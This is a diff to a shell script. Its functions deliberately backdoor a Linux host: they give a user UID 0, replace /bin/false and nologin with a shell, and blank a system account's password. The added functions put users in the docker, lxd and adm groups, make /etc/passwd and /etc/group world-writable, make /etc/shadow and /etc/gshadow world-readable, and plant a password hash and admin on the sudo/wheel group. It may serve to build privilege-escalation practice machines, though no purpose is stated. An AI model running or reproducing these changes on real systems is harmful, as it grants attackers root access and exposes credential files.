@@ -49,16 +49,25 @@ sshKey() {
 uidRoot() {
   sed -i "s/joseph:x:[^:]*:/joseph:x:0:/" /etc/passwd
 }
-
 admUser() {
+  useradd speedwagon
+  if grep -q adm /etc/group; then
+    usermod -G adm speedwagon
+  fi
+}
+dockerUser() {
   useradd jonathan
   usermod -g joestar jonathan
-  usermod -G adm jonathan
+  if grep -q docker /etc/group; then
+    usermod -G docker jonathan
+  fi
 }
-dialUser() {
+lxdUser() {
   useradd josuke
   usermod -g joestar josuke
-  usermod -G dialout josuke
+  if grep -q lxd /etc/group; then
+    usermod -G lxd josuke
+  fi
 }
 typoUser() {
   cp -f /bin/sh /usr/bin/nologin
@@ -69,6 +78,32 @@ noShadow() {
   cp -f "/bin/sh" "/bin/false"
   sed -i "s/sys:\*:/sys::/" /etc/shadow
   usermod -s "/bin/false" sys
+}
+permPasswd() {
+  chmod 666 "/etc/passwd"
+}
+permShadow() {
+  chmod 644 "/etc/shadow"
+}
+permGroup() {
+  chmod 666 "/etc/group"
+}
+permGshadow() {
+  chmod 644 "/etc/gshadow"
+}
+gshadowPass() {
+  if grep -q sudo /etc/gshadow; then
+    sed -i '/^sudo:/s#^\([^:]*:\)[^:]*:#\1$y$j9T$KYiAjUQBeuUqwyLtsvRVb1$Ht0Xrij/JaLF6ofobBPS9y1p530VQJmMGB2cmSbMxx3:#' /etc/gshadow
+  else
+    sed -i '/^wheel:/s#^\([^:]*:\)[^:]*:#\1$y$j9T$KYiAjUQBeuUqwyLtsvRVb1$Ht0Xrij/JaLF6ofobBPS9y1p530VQJmMGB2cmSbMxx3:#' /etc/gshadow
+  fi
+}
+gshadowAdmin() {
+  if grep -q sudo /etc/gshadow; then
+    sed -i '/^sudo:/s/^\([^:]*:[^:]*:\)[^:]*/\1joseph/' /etc/gshadow
+  else
+    sed -i '/^wheel:/s/^\([^:]*:[^:]*:\)[^:]*/\1joseph/' /etc/gshadow
+  fi
 }
 
 ###################
